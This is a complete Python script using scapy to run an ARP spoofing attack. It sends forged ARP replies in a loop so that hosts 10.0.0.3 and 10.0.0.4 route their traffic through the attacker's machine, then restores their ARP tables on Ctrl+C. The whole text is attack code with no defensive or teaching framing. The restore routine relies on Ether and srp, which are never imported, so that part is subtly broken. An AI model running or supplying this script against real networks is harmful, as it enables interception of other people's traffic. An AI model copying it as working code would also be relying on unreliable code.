from scapy.all import ARP, send
import time
import threading

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof_targets():
    try:
        while True:
            spoof("10.0.0.3", "10.0.0.4")
            spoof("10.0.0.4", "10.0.0.3")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C ! Restoring the network, please wait...")
        restore("10.0.0.3", "10.0.0.4")
        restore("10.0.0.4", "10.0.0.3")
        print("[!] Network restored")

# Start ARP spoofing in a separate thread
thread = threading.Thread(target=spoof_targets)
thread.start()
